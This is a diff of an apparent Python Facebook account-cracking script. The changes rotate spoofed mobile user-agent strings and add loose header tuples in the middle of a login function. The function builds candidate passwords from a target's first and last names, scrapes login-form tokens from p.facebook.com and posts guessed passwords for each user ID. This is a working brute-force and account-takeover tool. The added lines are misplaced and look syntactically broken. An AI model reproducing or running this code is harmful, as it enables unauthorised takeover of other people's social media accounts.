@@ -28,13 +28,13 @@ ani=('Fariya')
 love=('mbasic')
 ugen=[]
 ugen=[]
-ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/8612 (KHTML, like Gecko) Mobile/19A344 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS OS;FBSV/15.0;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Djezzy]",]
-ua = ["Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro Premium Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]",]
-ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6815B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/338.1.0.36.118;]",]
-ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; OPPO R11s Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/10.7.5.5 [FB_IAB/FB4A;FBAV/434.0.0.36.115]",]
-ua = ["Mozilla/5.0 (Linux; Android 12.0; HUAWEI Mate 50 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]",]
-ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0;ru-ru; EDI-AL10 Build/HUAWEIEDISON-AL10) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.1 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]",]
-ua = ["Mozilla/5.0 (Linux; Android 10; TECNO KE7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]",]
+ugen = ["Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Xiaomi MI 4(MI 4W) Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.6.3.0 (Baidu; P1 4.4.4)",]
+ugen2 = ["Mozilla/5.0 (Linux; U; Android 13; en-gb; Xiaomi 13 Ultra Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.37.1-gn",]
+ugen3 = ["Mozilla/5.0 (Linux; U; Android 13; fr-fr; TECNO CK6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/13.6",]
+ugen4 = ["Mozilla/5.0 (Linux; U; Android 13; es-es; Redmi Pad Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",]
+ugen5 = ["Mozilla/5.0 (Linux; Android 12; Armor X10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
+ugen6 = ["Mozilla/5.0 (Linux; Android 12; 2209116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.65821",]
+ugen7 = ["Mozilla/5.0 (Linux; Android 13; TECNO CK9n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/361.0.0.12.5;]",]
 for xd in range(10000):
         aa='Mozilla/5.0 (Linux; Android 10; SM-A505F Build/QP1A.190711.020; wv)'
         b=random.choice(['6','7','8','9','10','11','12',])
@@ -272,6 +272,23 @@ def m2(ids,names,passlist):
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'p.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+('user-agent', 'Mozilla/5.0 (Linux; Android 6.0; PGN605 Build/MRA58K; wv) 6; Linux; Android 6.0; PGN605O730T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.18179.0.4256.89 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/316.0.0.14.113;]')
+('accept-encoding', 'gzip, deflate, br')
+('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
+('Connection', 'keep-alive')
+('Host', 'mbasic.facebook.com')
+('viewport-width', '980')
+('sec-ch-ua', '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"')
+('sec-ch-ua-mobile', '?0')
+('sec-ch-ua-platform', '"Android"')
+('sec-ch-prefers-color-scheme', 'light')
+('dnt', '1')
+('upgrade-insecure-requests', '1')
+('sec-fetch-site', 'none')
+('sec-fetch-mode', 'navigate')
+('sec-fetch-user', '?1')
+('sec-fetch-dest', 'document')
+('accept-language', 'en-US,en;q=0.9')
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
